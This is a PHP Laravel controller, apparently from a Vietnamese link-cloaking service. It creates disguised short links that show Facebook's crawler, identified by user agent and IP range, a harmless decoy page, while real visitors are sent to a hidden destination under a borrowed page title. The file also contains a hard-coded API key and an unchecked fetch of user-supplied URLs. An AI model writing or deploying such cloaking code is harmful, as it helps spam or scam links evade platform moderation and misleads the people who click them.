<?php

namespace App\Http\Controllers;

use Agent;
use App\Domain;
use App\Link;
use Illuminate\Support\Facades\Redis;

class LinksController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth')->only('create', 'index');
    }

    public function index()
    {
        $links = auth()->user()->links()->latest()->paginate(20);
        $linksAdmin = Link::latest()->paginate(20);

        return view('links.index', compact('links', 'linksAdmin', 'clicks'));
    }
    public function create()
    {
        return view('links.create');
    }

    public function store()
    {
        $this->validate(request(), [
            'fake_link' => 'required',
            'real_link' => 'required',
        ]);

        $domain = Domain::orderByRaw('RAND()')->get(['name']);
        $domainName = $domain['0']->name;

        $sub = str_random(10);
        $linkBasic = str_random(40);
        $queryKey = str_random(3);
        $queryValue = str_random(7);
        if (strpos(request('fake_link'), 'webtretho') !== false) {
            $title = 'Webtretho - Cộng đồng phụ nữ lớn nhất Việt Nam';
        } else {
            $title = $this->getPageTitle(request('fake_link'));
        }

        $fullLink = 'http://' . auth()->user()->username . $sub . '.' . $domainName . '/' . $linkBasic;

        $tinyUrlLink = $this->createTinyUrlLink($fullLink);

        $link = Link::create([
            'title' => $title,
            'user_id' => auth()->id(),
            'fake_link' => request('fake_link'),
            'real_link' => request('real_link'),
            'link_basic' => $linkBasic,
            'query_key' => $queryKey,
            'query_value' => $queryValue,
            'sub' => $sub,
            'domain' => $domainName,
            'full_link' => $fullLink,
            'tiny_url_link' => $tinyUrlLink,
            'user_name' => auth()->user()->name,
        ]);
        flash('Tạo link thành công!', 'success');
        return back()->withInput(request()->all())->withLink($link);
    }

    public function show($link)
    {
        if (Redis::exists('links' . $link)) {
            $realLink = Redis::get('links' . $link);
            $title = Redis::get('links' . $link . 'title');
        }

        $url = Link::where('link_basic', '=', $link)->first();

        $realLink = $url->real_link;
        $title = $url->title;

        Redis::set('links' . $link, $realLink);
        Redis::set('links' . $link . 'title', $title);

        $ip = ip2long(request()->ip());
        if ($this->checkBadUserAgents() === true || $this->checkBadIp($ip)) {
            return redirect($url->fake_link);
        }

        // $query = request()->query();

        // if (!$query) {
        //     return redirect('http://google.com');
        // }

        Redis::incr('links.clicks' . $link);

        // Link::where('link_basic', '=', $link)->increment('clicks');

        // Client::create([
        //     'ip' => request()->ip(),
        //     'user_agent' => request()->header('User-Agent'),
        // ]);
        //
        // Redis::set('client.ip.' . request()->ip(), request()->ip());
        // Redis::set('client.user_agent.' . request()->header('User-Agent'), request()->header('User-Agent'));

        $currentTime = (int) date('G');

        if ($currentTime >= 0 && $currentTime <= 5 && Agent::isMobile()) {
            return view('links.redirectphilnews');
        }

        return view('links.redirect', compact('realLink', 'title'));
    }

    private function checkBadUserAgents()
    {
        $userAgent = request()->header('User-Agent');

        if (strpos($userAgent, 'facebookexternalhit/1.1') !== false || strpos($userAgent, 'facebookexternalhit') !== false || strpos($userAgent, 'Facebot') !== false) {
            return true;
        }

        return false;
    }

    public function edit(Link $link)
    {
        return view('links.edit', compact('link'));
    }

    public function destroy(Link $link)
    {
        $link->delete();

        flash('Xoá thành công!', 'success');

        return back();
    }

    public function createTinyUrlLink($link)
    {
        $curl = curl_init();

        $post_data = [
            'format' => 'text',
            'apikey' => '85D97C460CDBCAEBIB5A',
            'provider' => 'tinyurl_com',
            'url' => $link,
        ];

        $api_url = 'http://tiny-url.info/api/v1/create';
        curl_setopt($curl, CURLOPT_URL, $api_url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
        $result = curl_exec($curl);
        curl_close($curl);

        return $result;
    }

    private function checkBadIp($ip)
    {
        $lowIp = ip2long('66.100.0.0');
        $highIp = ip2long('66.255.255.255');
        if ($ip <= $highIp && $lowIp <= $ip) {
            return true;
        }
    }

    private function getPageTitle($url)
    {
        $fp = file_get_contents($url);
        if (!$fp) {
            return 'Xin hãy đợi, đang tải trang';
        }

        $res = preg_match("/<title>(.*)<\/title>/siU", $fp, $title_matches);
        if (!$res) {
            return 'Xin hãy đợi, đang tải trang';
        }

        // Clean up title: remove EOL's and excessive whitespace.
        $title = preg_replace('/\s+/', ' ', $title_matches[1]);
        $title = trim($title);
        return $title;
    }
}
